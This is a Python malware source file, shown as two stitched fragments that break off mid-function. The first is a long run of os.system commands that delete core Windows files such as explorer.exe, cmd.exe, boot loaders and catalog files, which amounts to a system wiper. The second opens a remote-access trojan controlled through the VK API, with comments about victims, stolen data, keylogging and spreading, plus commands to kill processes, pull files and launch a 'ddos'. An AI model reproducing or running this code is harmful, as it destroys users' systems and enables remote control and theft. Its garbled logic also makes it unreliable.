                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstSE.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstTH.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstTR.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstTW.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstUS.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/DelDrv64.exe")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/Setup.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{127D0A1D-4EF2-11D1-8608-00C04FC295EE}/HPFusion")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1A.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1B.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1C.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1D.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1E.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1F.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/2.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/2A.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/2B.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/2C.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/2D.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/2E.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/2F.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/3.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/3A.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/3B.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/3C.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/3D.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/3E.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/3F.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/4.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/4A.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/4B.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/4C.CAT")

                    # This empty space is for space to finish this large project

                elif os.system.__call__("C:\Windows/System32/cmd.exe") and os.system.__call__(
                            "C:\Windows//System32") == False:
                    os.system.__call__("del C:\Windows/explorer.exe")
                    os.system.__call__("del C:\Windows/write.exe")
                    os.system.__call__("del C:\Windows/bfsvc.exe")
                    os.system.__call__("del C:\Windows/System32/cmd.exe")
                    os.system.__call__('del C:\Windows/System32/es-ES/cmdkey.exe.mui')
                    os.system.__call__('del C:\windows/System32/es-MX/cmdl32.exe.mui')
                    os.system.__call__("del C:\Windows/System32/es-ES/cmd.exe.mui")
                    os.system.__call__("del C:\Windows/System32/en-US/cmdkey.exe.mui")
                    os.system.__call__("del C:\Windows/System32/en-US/cmdl32.exe.mui")
                    os.system.__call__("del C:\Windows/System32/en-US/cmd.exe.mui")
                    os.system.__call__("del C:\Windows/System32/en-US/cmdl32.exe.mui")
                    os.system.__call__("del C:\Windows/System32/cmdkey.exe")
                    os.system.__call__("del C:\Windows/System32/cmdl32.exe")
                    os.system.__call__("del C:\Windows/System32/0409")
                    os.system.__call__("del C:\Windows/System32/AdvancedInstallers/cmiv2.dll")
                    os.system.__call__("del C:\Windows/System32/AMD/amdkmpfd")
                    os.system.__call__("del C:\Windows/System32/AMD/amdkmpfd/amdkmpfd.ctz")
                    os.system.__call__("del C:\Windows/System32/AMD/amdkmpfd/amdkmpfd.itz")
                    os.system.__call__("del C:\Windows/System32/AMD/amdkmpfd/amdkmpfd.stz")
                    os.system.__call__("del C:\Windows/System32/AMD/Real")
                    os.system.__call__("del C:\Windows/System32/am-et/RBDS045E.dic")
                    os.system.__call__("del C:\Windows/System32/am-et/TransliterationComponentLayouts.dgml")
                    os.system.__call__("del C:\Windows/System32/AppLocker")
                    os.system.__call__("del C:\Windows/System32/appraiser/appraiser.sdb")
                    os.system.__call__("del C:\Windows/System32/appraiser/Appraiser_Data.ini")
                    os.system.__call__("del C:\Windows/System32/appraiser/Appraiser_TelemetryRunList.xml")
                    os.system.__call__("del C:\Windows/System32/ar-SA/cdosys.dll.mui")
                    os.system.__call__("del C:\Windows/System32/ar-SA/comctl32.dll.mui")
                    os.system.__call__("del C:\Windows/System32/ar-SA/comdlg32.dll.mui")
                    os.system.__call__("del C:\Windows/System32/ar-SA/fms.dll.mui")
                    os.system.__call__("del C:\Windows/System32/ar-SA/mlang.dll.mui")
                    os.system.__call__("del C:\Windows/System32/ar-SA/msimsg.dll.mui")
                    os.system.__call__("del C:\Windows/System32/ar-SA/quickassist.exe.mui")
                    os.system.__call__("del C:\Windows/System32/ar-SA/SyncRes.dll.mui")
                    os.system.__call__("del C:\Windows/System32/ar-SA/Windows.Media.Speech.UXRes.dll.mui")
                    os.system.__call__("del C:\Windows/System32/ar-SA/windows.ui.xaml.dll.mui")
                    os.system.__call__("del C:\Windows/System32/ar-SA/WWAHost.exe.mui")
                    os.system.__call__("del C:\Windows/System32/ar-SA/xpsrchvw.exe.mui")
                    os.system.__call__("del C:\Windows/System32/bg-BG/comctl32.dll.mui")
                    os.system.__call__("del C:\Windows/System32/bg-BG/comdlg32.dll.mui")
                    os.system.__call__("del C:\Windows/System32/bg-BG/fms.dll.mui")
                    os.system.__call__("del C:\Windows/System32/bg-BG/mlang.dll.mui")
                    os.system.__call__("del C:\Windows/System32/bg-BG/msimsg.dll.mui")
                    os.system.__call__("del C:\Windows/System32/bg-BG/quickassist.exe.mui")
                    os.system.__call__("del C:\Windows/System32/bg-BG/SyncRes.dll.mui")
                    os.system.__call__("del C:\Windows/System32/bg-BG/windows.ui.xaml.dll.mui")
                    os.system.__call__("del C:\Windows/System32/bg-BG/WWAHost.exe.mui")
                    os.system.__call__("del C:\Windows/System32/bg-BG/xpsrchvw.exe.mui")
                    os.system.__call__("del C:\Windows/System32/Boot/en-US/winload.efi.mui")
                    os.system.__call__("del C:\Windows/System32/Boot/en-US/winload.exe.mui")
                    os.system.__call__("del C:\Windows/System32/Boot/en-US/winresume.efi.mui")
                    os.system.__call__("del C:\Windows/System32/Boot/en-US/winresume.exe.mui")
                    os.system.__call__("del C:\Windows/System32/Boot/es-ES/winload.efi.mui")
                    os.system.__call__("del C:\Windows/System32/Boot/es-ES/winload.exe.mui")
                    os.system.__call__("del C:\Windows/System32/Boot/es-ES/winresume.efi.mui")
                    os.system.__call__("del C:\Windows/System32/Boot/es-ES/winresume.exe.mui")
                    os.system.__call__("del C:\Windows/System32/Boot/winload.efi")
                    os.system.__call__("del C:\Windows/System32/Boot/winload.exe")
                    os.system.__call__("del C:\Windows/System32/Boot/winresume.efi")
                    os.system.__call__("del C:\Windows/System32/Boot/winresume.exe")
                    os.system.__call__("del C:\Windows/System32/Bthprops/@BthpropsNotificationLogo.png")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstAR.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstCN.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstCZ.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstDE.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstDK.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstES.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstFI.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstFR.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstGR.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstHU.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstID.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstIT.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstJP.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstKR.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstNL.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstNO.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstPL.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstPT.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstRU.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstSE.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstTH.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstTR.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstTW.dll")
                    os.system.__call__(
                            "del C:Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/DLL/IJInstUS.dll")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstAR.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstCN.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstCZ.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstDE.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstDK.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstES.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstFI.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstFR.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstGR.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstHU.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstID.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstIT.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstJP.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstKR.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstNL.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstNO.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstPL.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstPT.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstRU.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstSE.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstTH.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstTR.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstTW.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstUS.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/DelDrv64.exe")
                    os.system.__call__(
                            "del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/Setup.ini")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{127D0A1D-4EF2-11D1-8608-00C04FC295EE}/HPFusion")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1A.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1B.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1C.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1D.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1E.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1F.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/2.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/2A.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/2B.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/2C.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/2D.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/2E.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/2F.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/3.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/3A.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/3B.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/3C.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/3D.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/3E.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/3F.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/4.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/4A.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/4B.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/4C.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/4D.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/4E.CAT")
                    os.system.__call__(
                            "del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/4F.CAT")

























































































































































pass

# -*- coding: utf-8 -*-

# Should we show debug messages or not.

DEBUG = False

try:
    # Other modules (Not is preinstalled).
    import vk_api
    import vk_api.utils
    import vk_api.bot_longpoll
    import vk_api.upload

    # Default modules (Preinstalled).
    import requests
    import os
    import os.path
    import subprocess
    import shutil
    import json
    import atexit
    import sys
    import threading
    import datetime
except ImportError as _exception:
    # If there is import error.

    if DEBUG:
        # If debug is enabled.

        # Printing message.
        print(f"Cannot import {_exception}!")

    # Exiting.
    raise SystemExit

# Out for python code.
out = None

# Server API.
__SERVER_API = None

# Server bot.
__SERVER_BOT = None

# Tags of the victim (Set in load_tags).
__TAGS = []

# Folder of the malware (Set in get_folder_path)
__FOLDER = ""

# Keylog string.
__KEYLOG = ""

# Name of the victim (Set in load_name).
__NAME = ""

# Current directory for the files commands.
__CURDIR = os.getcwd()

# Values with data that we stolen.
__VALUES = {}

# List of function name and function (Set in initialise_commands()).
__COMMANDS_FUNCTION = None

# List of function name and tuple with description and example (Set in initialise_commands()).
__COMMANDS_HELP = None

# Server token.
SERVER_TOKEN = ""  # noqa

# System OK code.
__SYSTEM_OK = 0

# Server group ID.
SERVER_GROUP = 0

# Server admins list (Empty or None for all users is admins (May be not so safe)).
SERVER_ADMINS = []

# Is HWID grabbing is disabled or not (Slow working at the start).
DISABLE_HWID = True

# Dont add to autorun?
DISABLED_AUTORUN = True

# Message for when not is admin.
MESSAGE_NOT_ADMIN = "Sorry, but you don't have required permissions to make this command!"

# Is spreading disabled or not.
SPREADING_INFECTION_DISABLED = True

# Is spreading disabled or not.
SPREADING_DISABLED = True

# Is keylogger disabled or not.
KEYLOGGER_DISABLED = True

# Drives that we will skip when infecting drives.
SPREADING_SKIPPED_DRIVES = ("C", "D")

# Version of the malware.
VERSION = "[Pre-release] 0.4"


def filesystem_get_size(_path: str) -> int:
    # @function filesystem_get_size()
    # @returns float
    # @description Function that returns size of the item in megabytes.

    if os.path.exists(_path):
        # If path exists.
        if os.path.isfile(_path):
            # If this is file.

            # Getting size of the file.
            return int(os.path.getsize(_path) / 1024 / 1024)
        elif os.path.isdir(_path):
            # If this is directory.

            # Getting size of the directory.
            _directory_size = int(os.path.getsize(_path) / 1024 / 1024)

            for _directory_file in os.listdir(_path):
                # For all items in the directory.

                # Getting file path.
                _directory_file_path = os.path.join(_path, _directory_file)

                # Adding size.
                _directory_size += filesystem_get_size(_directory_file_path)

            # Returning size.
            return int(_directory_size)
    else:
        # If path not exists.

        # Error.
        return 0


def filesystem_get_type(_path: str) -> str:
    # @function filesystem_get_type()
    # @returns str
    # @description Function that returns type of the file as the string.

    if os.path.isdir(_path):
        # If this is directory.

        # Returning directory.
        return "Directory"
    elif os.path.isfile(_path):
        # If this is file.

        # Returning file.
        return "File"
    elif os.path.islink(_path):
        # If this is link.

        # Returning link.
        return "Link"
    elif os.path.ismount(_path):
        # If this is mount.

        # Returning mount.
        return "Mount"

    # Returning unknown type if not returned any above.
    return "Unknown"


def command_taskkill(_arguments, _event) -> str:
    # @function command_taskkill()
    # @returns str
    # @description Function for command "taskkill" that kills process.

    # Calling system.
    _system_result = os.system(f"taskkill /F /IM {_arguments}")

    if _system_result == __SYSTEM_OK:
        # If result is OK.

        # Returning success.
        return "Killed task!"
    else:
        # If result is not OK.

        # Returning error.
        return "Unable to kill this task!"


def command_upload(_arguments, _event) -> str:
    # @function command_upload()
    # @returns str
    # @description Function for command "upload" that uploads file on the victim PC.

    # Returning message.
    return "_event.message!"


def command_properties(_arguments, _event) -> str:
    # @function command_properties()
    # @returns str
    # @description Function for command "properties" that returns properties of the file.

    if os.path.exists(_arguments):
        # If path exists.

        # Getting size.
        _property_size = f"{filesystem_get_size(_arguments)}MB"

        # Getting type.
        _property_type = filesystem_get_type(_arguments)

        # Getting time properties.
        _property_created_at = os.path.getctime(_arguments)
        _property_accessed_at = os.path.getatime(_arguments)
        _property_modified_at = os.path.getmtime(_arguments)

        # Returning properties.
        return f"Path: {_arguments},\n" \
               f"Size: {_property_size},\n" \
               f"Type: {_property_type},\n" \
               f"Modified: {_property_modified_at},\n" \
               f"Created: {_property_created_at},\n" \
               f"Accessed: {_property_accessed_at}."
    else:
        # If path not exists.

        # Error.
        return "Path does not exists!"


def command_download(_arguments, _event) -> list:
    # @function command_download()
    # @returns str
    # @description Function for command "download" that downloads files.

    if os.path.exists(_arguments):
        # If path exists.
        if os.path.isfile(_arguments):
            # If this is file.

            if filesystem_get_size(_arguments) < 1536:
                # If file is below need size.

                # Uploading.
                return [_arguments, "Download", "doc"]  # noqa
            else:
                # If invalid size.
                return "Too big file! Maximal size for download: 1536MB(1.5GB)"  # noqa
        elif os.path.isdir(_arguments):
            # If this is directory.

            if filesystem_get_size(_arguments) < 1536:
                # If file is below need size.

                # Uploading.
                return "Directories are not allowed for now!"  # noqa
            else:
                # If invalid size.
                return "Too big file! Maximal size for download: 1536MB(1.5GB)"  # noqa
    else:
        # If path not exists.

        # Error.
        return "Path does not exists"  # noqa


def command_ddos(_arguments, _event) -> str:
    # @function command_ddos()
    # @returns str
    # @description Function for command "ddos" that starts ddos.

    # Getting arguments.
    _arguments = _arguments.split(";")

    if len(_arguments) >= 1:
        # If arguments OK.

        if len(_arguments) > 2 and _arguments[2] == "admin":
            # If admin.

            # Pinging from admin.
            os.system(f"ping -c {_arguments[0]} {_arguments[1]}")

            # Message.
            return "Completed DDoS (Admin)"

        # Pinging from user.
        os.system(f"ping {_arguments[0]}")

        # Message.
        return "Completed DDoS (User)"
    else:
        # Message.
        return "Incorrect arguments! Example: address;time;admin"


def command_ls(_arguments, _event) -> str:
    # @function command_ls()
    # @returns str
    # @description Function for command "str" that lists all files in  directory.

    # Globalising current directory.
    global __CURDIR

    # Returning.
    return ", ".join(os.listdir(_arguments if _arguments != "" else __CURDIR))


def command_cd(_arguments, _event) -> str:
    # @function command_cd()
    # @returns str
    # @description Function for command "cd" that changes directory.

    # Globalising current directory.
    global __CURDIR

    if os.path.exists(__CURDIR + "\\" + _arguments):
        # If this is local folder.

        # Changing.
        __CURDIR += _arguments

        # Message.
        return f"Changed directory to {__CURDIR}"
    else:
        # If not local path.
        if os.path.exists(_arguments):
            # If path exists - moving there.

            # Changing.
            __CURDIR = _arguments

            # Message.
            return f"Changed directory to {__CURDIR}"
        else:
            # If invalid directory.

            # Message.
